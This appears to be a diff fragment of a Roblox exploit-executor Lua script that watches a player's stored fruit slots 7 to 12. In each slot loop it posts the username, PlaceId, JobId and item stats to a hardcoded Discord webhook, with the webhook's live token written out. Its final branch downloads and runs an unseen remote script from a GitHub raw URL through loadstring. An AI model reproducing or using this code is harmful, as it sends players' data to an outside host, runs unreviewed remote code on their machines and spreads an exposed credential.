+            for part7 in string.gmatch(fruitdatam, "[^,]+") do
+                local trimmed7 = part7:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts7, trimmed7)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts7[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                  "\nGameID: " .. game.PlaceId ..
+                                  "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 7 \nFruit: " .. fruitparts7[1] .. 
+                                  " " .. _G.fruitauraistrue .. 
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts7[2] ..
+                                  " ; Melee: " .. fruitparts7[3] ..
+                                  " ; Snip: " .. fruitparts7[4] ..
+                                  " ; Sword: " .. fruitparts7[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                local response = requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+                if response.StatusCode ~= 200 then
+                    warn("Failed to send data: " .. response.StatusMessage)
+                end
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error in script: " .. err)
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.3) do
+        local success, errorMsg = pcall(function()
+            -- Store initial fruit data
+            local userId = tostring(game.Players.LocalPlayer.UserId)
+            local fruitDataKey = "StoredDF8"
+            _G.fruitdata8 = workspace.UserData["User_" .. userId].Data[fruitDataKey].Value
+            
+            -- Wait until the fruit data changes and is not "None"
+            repeat task.wait(0.5) until workspace.UserData["User_" .. userId].Data[fruitDataKey].Value ~= _G.fruitdata8 
+                and workspace.UserData["User_" .. userId].Data[fruitDataKey].Value ~= "None"
+            
+            -- Retrieve updated fruit data
+            local fruitdataa = workspace.UserData["User_" .. userId].Data[fruitDataKey].Value
+            local fruitparts8 = {}
+            for part8 in string.gmatch(fruitdataa, "[^,]+") do
+                local trimmed8 = part8:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts8, trimmed8)  -- Add the trimmed part to the table
+            end
+            
+            -- Determine if the fruit has an aura
+            _G.fruitauraistrue = (fruitparts8[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name .. 
+                                  "\nGameID: " .. game.PlaceId .. 
+                                  "\nJobID: " .. game.JobId .. 
+                                  "\n============================================ \nStored DF Slot: 8 \nFruit: " .. fruitparts8[1] .. 
+                                  " " .. _G.fruitauraistrue .. 
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts8[2] .. 
+                                  " ; Melee: " .. fruitparts8[3] .. 
+                                  " ; Snip: " .. fruitparts8[4] .. 
+                                  " ; Sword: " .. fruitparts8[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            -- Send the HTTP request
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+        
+        if not success then
+            warn("Error occurred in script: " .. errorMsg)
+        end
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            -- Store the initial value
+            local userId = tostring(game.Players.LocalPlayer.UserId)
+            local userDataPath = workspace.UserData["User_" .. userId].Data.StoredDF9
+            _G.fruitdata9 = userDataPath.Value
+            
+            -- Wait for the value to change and ensure it's not "None"
+            repeat task.wait(0.5) until userDataPath.Value ~= _G.fruitdata9 and userDataPath.Value ~= "None"
+            
+            -- Retrieve the updated value
+            local fruitdataa = userDataPath.Value
+            local fruitparts9 = {}
+            
+            for part9 in string.gmatch(fruitdataa, "[^,]+") do
+                table.insert(fruitparts9, part9:match("^%s*(.-)%s*$")) -- Trim spaces
+            end
+            
+            -- Check for Aura Fruit
+            _G.fruitauraistrue = (fruitparts9[6] == "1") and "(Aura Fruit!!!)" or "(Normal Fruit)"
+            
+            -- Prepare data for Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                content = "",
+                embeds = {{
+                    title = "Saluna Notify",
+                    description = "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nGameID: " .. game.PlaceId .. "\nJobID: " .. game.JobId ..
+                                  "\n============================================ \nStored DF Slot: 9 \nFruit: " .. fruitparts9[1] .. " " .. _G.fruitauraistrue ..
+                                  "\nAffinity: :point_down:  \nDef: " .. fruitparts9[2] .. " ; Melee: " .. fruitparts9[3] .. " ; Snip: " .. fruitparts9[4] .. " ; Sword: " .. fruitparts9[5],
+                    type = "rich",
+                    color = tonumber(0x00FF7F)
+                }}
+            }
+            
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            local headers = { ["content-type"] = "application/json" }
+            
+            local requestFunction = http_request or request or HttpPost or syn.request
+            if requestFunction then
+                requestFunction({Url = url, Body = newdata, Method = "POST", Headers = headers})
+            else
+                warn("HTTP request function not available")
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            -- Fetching initial data
+            local playerId = tostring(game.Players.LocalPlayer.UserId)
+            local key = "StoredDF10"
+            _G.fruitdata10 = workspace.UserData["User_" .. playerId].Data[key].Value
+
+            -- Waiting for the value to change
+            repeat task.wait(0.5) until workspace.UserData["User_" .. playerId].Data[key].Value ~= _G.fruitdata10 and workspace.UserData["User_" .. playerId].Data[key].Value ~= "None"
+
+            -- Process the new data
+            local fruitdata10 = workspace.UserData["User_" .. playerId].Data[key].Value
+            local fruitparts10 = {}
+            for part10 in string.gmatch(fruitdata10, "[^,]+") do
+                local trimmed10 = part10:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts10, trimmed10)  -- Add the trimmed part to the table
+            end
+
+            -- Determine if it's an Aura Fruit or Normal Fruit
+            if fruitparts10[6] == "1" then
+                _G.fruitauraistrue = "(Aura Fruit!!!)"
+            else
+                _G.fruitauraistrue = "(Normal Fruit)"
+            end
+
+            -- Sending notification to Discord webhook
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = " Saluna Notify",
+                        ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                          "\nGameID: " .. game.PlaceId ..
+                                          "\nJobID: " .. game.JobId ..
+                                          "\n============================================ \nStored DF Slot: 10 \nFruit: " .. fruitparts10[1] .. " " .. _G.fruitauraistrue ..
+                                          "\nAffinity: :point_down:  \nDef: " .. fruitparts10[2] ..
+                                          " ; Melee: " .. fruitparts10[3] ..
+                                          " ; Snip: " .. fruitparts10[4] ..
+                                          " ; Sword: " .. fruitparts10[5],
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0x00FF7F)
+                    }
+                }
+            }
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+            local requestFunction = http_request or request or HttpPost or syn.request
+            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+            requestFunction(abcdef)
+        end)
+    end
+end)
+
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            local playerId = tostring(game.Players.LocalPlayer.UserId)
+            local key = "StoredDF11"
+            _G.fruitdata11 = workspace.UserData["User_"..playerId].Data[key].Value
+            
+            repeat task.wait(0.5) until workspace.UserData["User_"..playerId].Data[key].Value ~= _G.fruitdata11 and workspace.UserData["User_"..playerId].Data[key].Value ~= "None"
+            
+            local fruitdata11 = workspace.UserData["User_"..playerId].Data[key].Value
+            local fruitparts11 = {}
+            
+            for part11 in string.gmatch(fruitdata11, "[^,]+") do
+                local trimmed11 = part11:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts11, trimmed11)  -- Add the trimmed part to the table
+            end
+
+            if fruitparts11[6] == "1" then
+                _G.fruitauraistrue = "(Aura Fruit!!!)"
+            else
+                _G.fruitauraistrue = "(Normal Fruit)"
+            end
+
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = " Saluna Notify",
+                        ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                          "\nGameID: " .. game.PlaceId ..
+                                          "\nJobID: " .. game.JobId ..
+                                          "\n============================================ \nStored DF Slot: 11 \nFruit: " .. fruitparts11[1] .. " " .. _G.fruitauraistrue ..
+                                          "\nAffinity: :point_down:  \nDef: "..fruitparts11[2] ..
+                                          " ; Melee: " .. fruitparts11[3] ..
+                                          " ; Snip: " .. fruitparts11[4] ..
+                                          " ; Sword: " .. fruitparts11[5],
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0x00FF7F)
+                    }
+                }
+            }
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+            
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+            local requestFunction = http_request or request or HttpPost or syn.request
+            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+            requestFunction(abcdef)
+        end)
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.3) do
+        pcall(function()
+            _G.fruitdata12 = workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.StoredDF12.Value
+            repeat task.wait(0.5) until workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.StoredDF12.Value ~= _G.fruitdata12 and workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.StoredDF12.Value ~= "None"
+            local fruitdataa = workspace.UserData["User_"..tostring(game.Players.LocalPlayer.UserId)].Data.StoredDF12.Value
+            local fruitparts12 = {}
+            for part12 in string.gmatch(fruitdataa, "[^,]+") do
+                local trimmed12 = part12:match("^%s*(.-)%s*$")  -- Trim spaces
+                table.insert(fruitparts12, trimmed12)  -- Add the trimmed part to the table
+            end
+
+            if fruitparts12[6] == "1" then
+                _G.fruitauraistrue = "(Aura Fruit!!!)"
+            else
+                _G.fruitauraistrue = "(Normal Fruit)"
+            end
+
+            local url = "https://discord.com/api/webhooks/1364583258473365536/6pkqS5LSrKdbBIVv90BCUA3mAAd1r8Hox1gq2QCu8fx7wsX4WZlmBHMLnzcRnERpF4DG"
+            local data = {
+                ["content"] = "",
+                ["embeds"] = {
+                    {
+                        ["title"] = " Saluna Notify",
+                        ["description"] = "\nUsername: " .. game.Players.LocalPlayer.Name ..
+                                          "\nGameID: " .. game.PlaceId ..
+                                          "\nJobID: " .. game.JobId ..
+                                          "\n============================================ \nStored DF Slot: 12 \nFruit: " .. fruitparts12[1] .. " " .. _G.fruitauraistrue ..
+                                          "\nAffinity: :point_down:  \nDef: " .. fruitparts12[2] ..
+                                          " ; Melee: " .. fruitparts12[3] ..
+                                          " ; Snip: " .. fruitparts12[4] ..
+                                          " ; Sword: " .. fruitparts12[5],
+                        ["type"] = "rich",
+                        ["color"] = tonumber(0x00FF7F)
+                    }
+                }
+            }
+            local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+            local headers = {
+                ["content-type"] = "application/json"
+            }
+            request = http_request or request or HttpPost or syn.request
+            local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+            request(abcdef)
+        end)
+    end
+end)
+end)
+end
+
+else
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/rllysus.lua',true))()
+end
